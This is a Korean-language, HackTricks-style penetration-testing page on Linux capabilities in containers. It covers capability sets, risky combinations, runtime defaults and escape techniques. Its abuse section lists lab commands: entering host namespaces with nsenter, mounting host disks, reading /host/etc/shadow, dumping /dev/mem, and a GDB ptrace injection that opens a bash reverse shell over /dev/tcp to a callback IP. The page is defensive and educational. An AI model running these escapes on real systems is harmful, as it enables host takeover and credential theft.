# 컨테이너의 Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

Linux capabilities는 컨테이너 security에서 가장 중요한 요소 중 하나입니다. 이는 미묘하지만 근본적인 질문에 답하기 때문입니다. **컨테이너 내부에서 "root"란 실제로 무엇을 의미하는가?** 일반적인 Linux system에서는 UID 0이 역사적으로 매우 광범위한 권한 집합을 의미했습니다. 최신 kernel에서는 이러한 권한이 capabilities라는 더 작은 단위로 분해됩니다. 관련 capabilities가 제거된 경우, process는 root로 실행되더라도 강력한 작업을 수행하지 못할 수 있습니다. <sup>[[1]](#references)</sup>

컨테이너는 이러한 구분에 크게 의존합니다. 많은 workload는 호환성이나 단순성을 이유로 컨테이너 내부에서 여전히 UID 0으로 실행됩니다. capability dropping이 없다면 이는 지나치게 위험합니다. capability dropping을 사용하면 containerized root process가 일반적인 컨테이너 내부 작업을 수행하면서도 더 민감한 kernel 작업은 거부될 수 있습니다. 따라서 컨테이너 shell에 `uid=0(root)`가 표시된다고 해서 자동으로 "host root" 또는 "광범위한 kernel privilege"를 의미하지는 않습니다. capability set이 해당 root identity가 실제로 어느 정도의 가치가 있는지를 결정합니다.

전체 Linux capability reference와 다양한 abuse 예시는 다음을 참조하세요.

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 동작

Capabilities는 permitted, effective, inheritable, ambient 및 bounding set을 포함한 여러 set으로 추적됩니다. 많은 컨테이너 assessment에서 각 set의 정확한 kernel semantics보다 즉시 중요한 실질적인 질문은 다음과 같습니다. **이 process가 지금 성공적으로 수행할 수 있는 privileged operation은 무엇이며, 앞으로 어떤 privilege gain이 여전히 가능한가?** <sup>[[1]](#references)</sup>

이것이 중요한 이유는 많은 breakout technique이 실제로는 컨테이너 문제로 위장한 capability 문제이기 때문입니다. `CAP_SYS_ADMIN`이 있는 workload는 일반적인 container root process가 접근해서는 안 되는 방대한 kernel functionality에 접근할 수 있습니다. `CAP_NET_ADMIN`이 있는 workload는 host network namespace도 공유하는 경우 훨씬 더 위험해집니다. `CAP_SYS_PTRACE`가 있는 workload는 host PID sharing을 통해 host process를 볼 수 있다면 더욱 주목할 만합니다. Docker 또는 Podman에서는 이것이 `--pid=host`로 나타날 수 있으며, Kubernetes에서는 일반적으로 `hostPID: true`로 나타납니다.

즉, capability set은 단독으로 평가할 수 없습니다. namespaces, seccomp 및 MAC policy와 함께 해석해야 합니다.

## Lab

컨테이너 내부에서 capabilities를 검사하는 매우 직접적인 방법은 다음과 같습니다:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
더 제한적인 컨테이너와 모든 capabilities가 추가된 컨테이너를 비교할 수도 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
범위를 좁혀 추가했을 때의 효과를 확인하려면, 모든 것을 제거한 뒤 capability 하나만 다시 추가해 보세요:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
이러한 간단한 실험은 runtime이 단순히 `"privileged"`라는 boolean을 전환하는 것이 아님을 보여 줍니다. runtime은 프로세스에 실제로 제공되는 privilege surface를 구성합니다.

## High-Risk Capabilities

Capabilities는 해당 작업이 **host가 관리하는 resource**에 도달할 때만 escape primitive가 됩니다. 반복해서 나타나는 high-risk 조합은 다음과 같습니다.

- **`CAP_SYS_ADMIN`**과 host PID, block device 또는 writable kernel-control path의 조합. 대상 mount namespace에 참여하려면 추가로 `CAP_SYS_CHROOT`가 필요하며, block 기반 filesystem을 mount하려면 initial user namespace에서 `CAP_SYS_ADMIN`이 필요합니다.
- **`CAP_SYS_PTRACE`**와 host PID 가시성 및 attach 가능한 host process의 조합. ptrace injection에는 `CAP_SYS_ADMIN`이 필요하지 않습니다.
- **`CAP_DAC_OVERRIDE` 또는 `CAP_DAC_READ_SEARCH`**와 접근 가능한 host filesystem의 조합. 이러한 capabilities는 서로 다른 DAC 검사를 우회하지만 host filesystem view를 생성하지는 않습니다.
- initial user namespace의 **`CAP_SYS_MODULE`**과 허용되며 kernel과 호환되는 module의 조합. 일반적인 Linux containers는 node kernel을 공유하지만, VM 또는 userspace-kernel runtime은 이러한 경계를 변경합니다.
- initial user namespace의 **`CAP_MKNOD`**와 device cgroup이 이미 허용한 실제 host device의 조합. node를 생성해도 device cgroup은 우회되지 않습니다.
- **`CAP_SYS_RAWIO`**와 노출되어 사용 가능한 memory, I/O-port, PCI 또는 device-control interface의 조합.
- host reboot를 위한 initial PID namespace와 **`CAP_SYS_BOOT`**의 조합, 또는 kernel 교체에 사용할 수 있고 허용된 kexec path.
- 직접적인 node network-state 제어를 위한 host network namespace의 **`CAP_NET_ADMIN`**. **`CAP_NET_RAW`**는 protocol-specific escape에 관여할 수 있지만, raw socket만으로 node shell이 제공되지는 않습니다.

`CAP_SYS_CHROOT`는 의도적으로 standalone escape capability로 나열하지 않았습니다. mount-namespace `setns()`에 필요할 수 있고 이미 접근 가능한 host tree를 더 쉽게 사용할 수 있게 해 주지만, `chroot()`만으로는 해당 tree가 노출되지 않으며 새로운 filesystem permissions도 부여되지 않습니다. 마찬가지로 `CAP_BPF`와 `CAP_PERFMON`은 강력한 telemetry 및 kernel attack surface를 노출하지만, 별도의 kernel flaw가 없다면 일반적인 작업만으로는 generic container escapes가 발생하지 않습니다.

## Runtime Usage

Docker, Podman, containerd 기반 stacks 및 CRI-O는 모두 capability controls를 사용하지만, defaults와 management interfaces는 서로 다릅니다. Docker는 `--cap-drop` 및 `--cap-add`와 같은 flags를 통해 이를 직접 노출합니다. Podman은 유사한 controls를 제공하며, 추가적인 safety layer로 rootless execution과 함께 사용하는 경우가 많습니다. Kubernetes는 Pod 또는 container의 `securityContext`를 통해 capability additions 및 drops를 노출하고, lower-level runtimes는 OCI runtime configuration에 결과 sets를 표현합니다. LXC 및 Incus와 같은 system-container environments도 capability control에 의존하지만, 더 폭넓은 host integration 때문에 operators가 application container에서라면 유지했을 defaults를 더 공격적으로 완화하도록 유도할 수 있습니다. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

동일한 원칙이 이들 모두에 적용됩니다. 기술적으로 부여할 수 있는 capability라고 해서 반드시 부여해야 하는 것은 아닙니다. 실제 incidents의 상당수는 workload가 더 엄격한 configuration에서 실패했고 team에 빠른 해결책이 필요하다는 이유만으로 operator가 capability를 추가하면서 시작됩니다.

## Misconfigurations

가장 명백한 실수는 Docker/Podman 스타일 CLIs에서 **`--cap-add=ALL`**을 사용하는 것이지만, 이것이 유일한 실수는 아닙니다. 실제로 더 일반적인 문제는 namespace, seccomp 및 mount implications를 제대로 이해하지 않은 상태에서 "application을 작동시키기" 위해 하나 또는 두 개의 매우 강력한 capabilities, 특히 `CAP_SYS_ADMIN`을 부여하는 것입니다. 또 다른 일반적인 failure mode는 추가 capabilities를 host namespace sharing과 결합하는 것입니다. Docker 또는 Podman에서는 `--pid=host`, `--network=host` 또는 `--userns=host`로 나타날 수 있으며, Kubernetes에서는 일반적으로 `hostPID: true` 또는 `hostNetwork: true`와 같은 workload settings를 통해 동일한 exposure가 발생합니다. 이러한 각 조합은 capability가 실제로 영향을 줄 수 있는 범위를 변경합니다.

또한 workload가 완전히 `--privileged` 상태가 아니므로 여전히 의미 있게 제한되어 있다고 administrators가 믿는 경우도 흔합니다. 때로는 이것이 사실이지만, 때로는 effective posture가 이미 privileged에 충분히 가까워져 있어 operationally 그 차이가 더 이상 중요하지 않습니다.

## Abuse

먼저 effective sets, user-namespace mapping, seccomp state, namespaces, mounts 및 devices를 기록합니다. 이러한 context가 없는 capability name만으로는 escape를 입증할 수 없습니다.
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces 및 block devices

host PID visibility가 있으면 `CAP_SYS_ADMIN`으로 host namespaces에 진입할 수 있습니다. mount-namespace 작업에는 호출자의 user namespace에 `CAP_SYS_CHROOT`도 필요합니다.

**capability 및 confinement 확인:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**대상을 열거하세요:** container/Pod configuration 또는 명확한 host process list를 통해 host PID sharing을 확인한 다음, 대상 namespace를 검사하세요. private PID namespace에도 local PID 1이 존재하므로, 이것만으로는 host PID sharing을 입증할 수 없습니다.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**namespace path exploit:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Capability 검사는 대상이 속한 user namespaces에서 성공해야 합니다. `--pid=host` 또는 Kubernetes의 `hostPID: true`는 가시성을 제공할 뿐 capabilities를 제공하지는 않습니다.

대체 block-device 경로에서는 후보를 **열거**한 다음, 검증된 후보를 먼저 read-only로 마운트하여 접근 가능한 filesystem을 **exploit**하십시오:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
디바이스 노드가 존재해야 하고, device cgroup에서 이를 허용해야 하며, block-filesystem mount에는 initial user namespace의 `CAP_SYS_ADMIN`이 필요합니다. `/host`에 이미 bind-mounted된 host root는 `CAP_SYS_ADMIN` 없이도 가능한 host access입니다. `chroot /host`는 편의를 위한 방법일 뿐이며, 별도로 `CAP_SYS_CHROOT`가 필요합니다.

### 접근 가능한 host root: 직접 filesystem 실행

host root가 이미 `/host`에 mount되어 있다면, 먼저 mount를 확인한 다음 기존 access를 직접 사용합니다. 이 경로는 `CAP_SYS_ADMIN`에 의존하지 않습니다.
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
`chroot()`를 사용할 수 없지만 호스트 binary가 container의 architecture 및 loader와 호환된다면, 대신 mount된 tree를 통해 호출할 수 있는 경우가 많습니다:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
`/host` 아래에서 직접 읽고 쓰는 것은 이미 host-filesystem compromise입니다. `chroot()` 또는 host binary 실행은 해당 접근을 더 편리하게 만들 뿐이며, 어느 작업도 host mount를 생성하거나 read-only mount 또는 MAC policy를 우회하지 않습니다.

### `CAP_SYS_PTRACE`: host-process injection

host PID visibility 및 대상의 user namespace 내 `CAP_SYS_PTRACE`가 있으면 GDB를 사용해 승인된 host process가 `system()`을 호출하도록 만들 수 있습니다. `CAP_SYS_ADMIN`은 필요하지 않습니다.

**capability 및 attachment controls를 확인합니다:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**일회용 target을 열거하고 선택:** 구성 또는 명확한 node 프로세스 목록을 통해 host PID 공유를 확인하고, PID 1이나 중요 daemon은 절대 선택하지 마세요.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**선택한 프로세스 Exploit**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
대상은 attach할 수 있어야 하며, 사용 가능한 `system()` 심볼과 Bash payload 경로가 있어야 합니다. Yama, non-dumpable 상태, seccomp, user namespaces 및 MAC policy가 이 chain을 차단할 수 있습니다. GDB는 attach된 동안 대상을 중지하므로, disposable lab process만 사용해야 합니다.

### `CAP_DAC_OVERRIDE` 및 `CAP_DAC_READ_SEARCH`: 보호된 host 파일

이 capability들은 host filesystem을 노출하지 않습니다. `/host`가 이미 host mount인 경우, `CAP_DAC_READ_SEARCH`는 read/search DAC 검사를 우회할 수 있으며 `CAP_DAC_OVERRIDE`는 일반적인 write 검사도 추가로 우회할 수 있습니다.

**capability 확인:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**노출된 호스트 파일 시스템을 열거하고 대상 권한을 확인하세요:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
폐기 가능한 lab에서 **read 및 write bypasses**를 실행해 보세요:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
읽기 전용 mount와 LSM rules는 여전히 적용됩니다. `CAP_DAC_READ_SEARCH`는 `open_by_handle_at()`도 사용할 수 있도록 허용하지만, Shocker와 같은 breakout에는 동일한 underlying filesystem에 대한 mount file descriptor, 유효하거나 검색 가능한 handles, 호환되는 filesystem/storage layout, 그리고 runtime 또는 LSM block이 추가로 필요합니다. 이는 mount namespace 외부의 모든 filesystem에 대한 임의 access를 제공하지 않습니다.

### `CAP_SYS_MODULE`: shared-kernel 실행

일반적인 Linux container에서는 허용된 module이 shared host kernel에서 실행됩니다.

**capability와 user-namespace scope를 확인합니다:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**모듈 로딩 전제 조건 열거:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**호환되는 사전 검토된 proof module을 사용해 disposable node에서만 exploit하세요:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Capability는 initial user namespace에서 effective 상태여야 합니다. Kernel 버전 및 configuration, module signatures, lockdown, seccomp, LSM policy가 load를 허용해야 합니다. Kata, gVisor, Hyper-V isolation 및 유사한 runtime은 workload가 도달하는 kernel boundary를 변경합니다.

### `CAP_MKNOD`: 허용된 device handle 생성

`CAP_MKNOD`는 device node를 생성하지만 device cgroup을 우회하지는 않습니다. Device 생성은 namespaced되지 않으므로 capability는 initial user namespace에서 effective 상태여야 합니다.

**Capability 및 user-namespace scope 확인:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**실제 디바이스, 해당 major/minor 번호 및 확인 가능한 cgroup-v1 allowlist를 열거하세요:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**검증된 ext-family candidate를 read-only로 exploit:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
다른 filesystem에는 이에 대응하는 read-only 도구가 필요하며, device를 mount하려면 추가로 `CAP_SYS_ADMIN`이 필요합니다. 생성된 node를 열 때 `Operation not permitted`가 표시되는 경우, 일반적으로 device cgroup이 여전히 이를 차단하고 있다는 의미입니다. cgroup v2에서는 device access가 일반적으로 BPF로 적용되며 `devices.list` 파일이 존재하지 않으므로, 성공적인 open이 결정적인 테스트입니다.

### `CAP_SYS_RAWIO`: 노출된 raw-I/O 인터페이스

이식 가능한 일반 payload는 없습니다. 유효한 주소와 effects는 hardware 및 kernel configuration에 따라 달라집니다.

**capability와 user-namespace scope를 확인합니다:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**노출된 raw 인터페이스, 하드웨어 및 드라이버를 열거하세요:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**식별된 장치 및 주소 범위에 대해 승인된 proof를 사용하여서만 Exploit하세요.** `/dev/mem`이 lab에서 승인된 인터페이스라면, 이 템플릿은 내용을 출력하지 않고 node-memory disclosure를 입증합니다:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
주소는 lab의 hardware map에서 가져와야 합니다. 일부 MMIO 영역을 읽으면 side effect가 발생할 수 있기 때문입니다. 일반적인 memory-write 명령은 오해를 일으키고 안전하지 않습니다. 동일한 주소가 한 시스템에서는 무해할 수 있지만, 다른 시스템에서는 hardware 또는 kernel memory를 제어할 수 있습니다. Device cgroups, filesystem permissions, 엄격한 `/dev/mem`, kernel lockdown, virtualization, 그리고 LSM policy가 유용한 access를 일반적으로 차단합니다.

### `CAP_SYS_BOOT`: namespace reboot 또는 kernel replacement

Private PID namespace에서 `reboot()`은 host를 reboot하는 대신 해당 namespace의 init process를 종료합니다. 따라서 host reboot의 영향에는 initial PID namespace가 필요하며, 일반적으로 host PID sharing을 통해 접근합니다. kexec 경로에도 호환되는 kernel image와 허용적인 lockdown/signature policy가 필요합니다:

**Capability 확인:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**PID namespace 및 kexec prerequisites를 열거하세요:** workload 구성에서 host PID sharing을 확인하세요. PID namespace link만으로는 해당 namespace가 node의 initial namespace인지 알 수 없습니다.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**일회용 lab node를 reboot하는 것이 명시적인 exercise인 경우에만 Exploit하세요:**
```bash
sync
reboot -f
```
해당 capability를 입증하기 위해 shared node에서 그 command를 실행하거나 kernel을 로드하지 마세요. private PID namespace에서는 해당 namespace의 init process만 종료하며, host에 미치는 영향을 입증하지 않습니다.

### `CAP_NET_ADMIN` 및 `CAP_NET_RAW`: host network 경로

`CAP_NET_ADMIN`은 현재 network namespace에만 영향을 줍니다.

**capabilities 및 confinement을 확인하세요:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**현재 네트워크를 열거하고 workload 구성에서 host networking을 확인합니다:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**`CAP_NET_ADMIN`을 되돌릴 수 있는 방식으로 활용하기:** host networking을 사용하면 temporary interface는 node interface이다.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW`는 RAW 및 PACKET sockets를 허용하지만 일반적인 host shell은 아닙니다. 문서화된 GCE chain을 **열거**하려면 metadata route를 확인하고 plaintext guest-agent traffic이 관찰 가능한지 캡처합니다:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
매칭되는 사전 조건이 존재한다면 [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html)에 문서화된 환경별 chain을 **exploit**합니다. 요청과 sequence 상태를 캡처하고, SSH key가 포함된 위조 metadata response를 inject한 다음 host access를 검증합니다. 이 chain에는 root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, 평문 GCE metadata traffic, 그리고 race 가능한 guest-agent request가 필요합니다. 최신 transport 또는 agent 동작으로 인해 이 chain이 작동하지 않을 수 있습니다.

## Checks

capability checks의 목표는 raw value를 dump하는 것뿐만 아니라, 해당 process가 현재 namespace 및 mount 상황을 위험하게 만들 수 있을 만큼 충분한 privilege를 보유하고 있는지 파악하는 것입니다.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
여기서 흥미로운 점은 다음과 같습니다.

- `capsh --print`는 `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` 또는 `cap_sys_module`과 같은 high-risk capabilities를 확인하는 가장 쉬운 방법입니다.
- `/proc/self/status`의 `CapEff` 줄은 다른 set에서 사용 가능할 수 있는 항목이 아니라, 현재 실제로 유효한 항목을 보여 줍니다.
- container가 host PID, network 또는 user namespaces를 공유하거나 쓰기 가능한 host mounts를 가지고 있다면 capability dump는 훨씬 더 중요해집니다.

raw capability 정보를 수집한 후 다음 단계는 해석입니다. process가 root인지, user namespaces가 활성화되어 있는지, host namespaces가 공유되는지, seccomp가 enforcing 상태인지, AppArmor 또는 SELinux가 여전히 process를 제한하는지 확인해야 합니다. capability set 자체는 전체 상황의 일부일 뿐이지만, 동일해 보이는 시작 지점에서 한 container breakout은 성공하고 다른 하나는 실패하는 이유를 설명해 주는 경우가 많습니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 Reduced capability set | Docker는 capabilities의 기본 allowlist를 유지하고 나머지는 drop합니다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | 기본적으로 Reduced capability set | Podman containers는 기본적으로 unprivileged이며 reduced capability model을 사용합니다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 변경되지 않으면 runtime defaults를 상속 | `securityContext.capabilities`가 지정되지 않으면 container는 runtime에서 제공하는 기본 capability set을 얻습니다 | `securityContext.capabilities.add`, `drop: [\"ALL\"]`을 설정하지 않음, `privileged: true` |
| containerd / CRI-O under Kubernetes | 일반적으로 runtime default | effective set은 runtime과 Pod spec에 따라 달라집니다 | Kubernetes 행과 동일하며, 직접적인 OCI/CRI configuration에서도 capabilities를 명시적으로 추가할 수 있습니다 |

Kubernetes에서 중요한 점은 API가 하나의 universal default capability set을 정의하지 않는다는 것입니다. Pod에서 capabilities를 add하거나 drop하지 않으면 workload는 해당 node의 runtime default를 상속합니다.

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
